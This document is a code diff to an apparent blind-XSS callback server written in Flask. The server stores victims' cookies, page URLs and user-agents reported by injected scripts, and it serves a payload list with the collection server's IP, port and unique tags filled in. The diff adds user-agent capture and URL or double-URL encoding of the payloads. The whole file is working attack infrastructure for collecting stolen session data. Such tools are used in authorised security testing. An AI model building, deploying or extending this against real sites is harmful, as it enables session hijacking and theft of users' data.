@@ -12,6 +12,8 @@ import shutil
 import os
 import threading
 from time import sleep
+import urllib
+from urllib import parse
 
 
 main = Blueprint('main', __name__)
@@ -29,6 +31,9 @@ def index():
 @login_required
 def test():
     return render_template('test.html')
+
+def generate_unique():
+    return str(uuid.uuid4())
 
 # new xss/xxe found, store it inside the db: stage_1
 @main.route(config["main_endpoint"] + '/<path:xxx>/<path:random_str>', methods=['GET'])
@@ -89,7 +94,7 @@ def new_xxx(xxx, random_str):
     else:
         return ""
 
-# grab cookie, url, uid after stage_2
+# grab cookie, url, user-agent uid after stage_2
 @main.route(config["main_endpoint"] + config["stage_2_endpoint"] + '/<path:xxx_uid>', methods=['POST'])
 def grab_info(xxx_uid):
     # POST's content is a json base64 encoded
@@ -107,6 +112,7 @@ def grab_info(xxx_uid):
         xss_uid = str(xxx_uid)
         url = str(info["url"])
         cookie = str(info["cookie"])
+        user_agent = str(info["user_agent"])
     except Exception as e:
         print(str(e))
         print("[-] Error_1 in get_info()")
@@ -115,6 +121,7 @@ def grab_info(xxx_uid):
     try:
         xxx = XSS.query.filter_by(xss_uid=xss_uid).first()
         if xxx:
+            xxx.user_agent = user_agent
             xxx.cookie = cookie
             xxx.url = url
             xxx.xss_stage_2 = True
@@ -169,6 +176,7 @@ def unblind():
         content["xss_value"] = x.xss_value
         content["xss_ip_from"] = x.xss_ip_from
         content["cookie"] = x.cookie
+        content["user_agent"] = x.user_agent
         content["url"] = x.url
 
         xss_results[c] = content
@@ -183,16 +191,44 @@ def unblind():
 @main.route(config["main_endpoint"] + config["payload_lst_endpoint"], methods=['GET'])
 @login_required
 def payloads_lst():
-    payloads = config["payloads"]
+
+    if len(request.args) >= 2:
+        try:
+            fieldname = request.args["fieldname"]
+            encoding = request.args["encoding"]
+            #print(fieldname)
+            unique = fieldname + "-" + generate_unique()
+            encoding = request.args["encoding"]
+        except:
+            unique = generate_unique()
+            encoding = "no_encoding"
+    else:
+        unique = generate_unique()
+        encoding = "no_encoding"
+
+    
+    payloads_lst = config["payloads_lst"]
+    current_dir = os.getcwd()
+    #print(current_dir)
+    with open(current_dir + "/" + payloads_lst, "r") as fp:
+        p = fp.read()
+    payloads = json.loads(p)
+    payloads = payloads["payloads"]
 
     url = config["unblind_url"]
     port = config["unblind_port"]
     stage_1_endpoint = config["stage_1_endpoint"]
 
     for i in payloads:
-        i["payload"] = i["payload"].replace("{{IP}}", url )
+        i["payload"] = i["payload"].replace("{{IP}}", url)
         i["payload"] = i["payload"].replace("{{PORT}}", port)
         i["payload"] = i["payload"].replace("{{ENDPOINT}}", stage_1_endpoint)
+        i["payload"] = i["payload"].replace("{{UNIQUE_STR}}", unique)
+
+        if encoding == "url_encoding":
+            i["payload"] = urllib.parse.quote_plus(i["payload"])
+        elif encoding == "double_url_encoding":
+            i["payload"] = urllib.parse.quote_plus(urllib.parse.quote_plus(i["payload"]))
 
     p = {"p":payloads}
 
